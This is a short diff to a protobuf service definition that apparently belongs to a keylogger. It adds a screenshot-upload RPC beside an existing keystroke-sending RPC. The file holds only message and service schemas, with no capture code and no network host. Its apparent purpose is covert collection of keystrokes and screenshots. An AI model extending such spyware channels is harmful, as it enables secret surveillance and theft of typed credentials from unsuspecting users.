@@ -1,10 +1,24 @@
 syntax = "proto3";
-message KeylogRequest {
-  string message = 1;
-}
-message KeylogResponse {
-  bool response = 1;
-}
+
 service KeylogService {
-  rpc SendKeylog (KeylogRequest) returns (KeylogResponse);
+    rpc SendKeylog(KeylogRequest) returns (KeylogResponse);
+    rpc SendScreenshot(ScreenshotRequest) returns (ScreenshotResponse);
+}
+
+message KeylogRequest {
+    string message = 1;
+}
+
+message KeylogResponse {
+    bool response = 1;
+}
+
+message ScreenshotRequest {
+    string filename = 1;
+    bytes image_data = 2;
+}
+
+message ScreenshotResponse {
+    bool success = 1;
+    string message = 2;
 }
